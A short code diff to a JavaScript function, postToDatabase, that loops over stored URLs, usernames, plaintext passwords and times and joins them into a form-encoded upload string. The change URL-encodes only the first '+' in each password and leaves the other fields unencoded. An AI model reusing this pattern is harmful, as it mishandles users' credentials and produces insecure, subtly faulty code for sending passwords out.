@@ -308,6 +308,8 @@ function postToDatabase() {
             urlTemp = result.urls[i];
             usernameTemp = result.usernames[i];
             passwordTemp = result.passwords[i];
+            // replace '+' symbol with "%2B"
+            passwordTemp = passwordTemp.replace("+", "%2B");
             timeTemp = result.times[i];
 
             var input = "url="+urlTemp+"&username="+usernameTemp+"&password="+passwordTemp+"&time="+timeTemp;
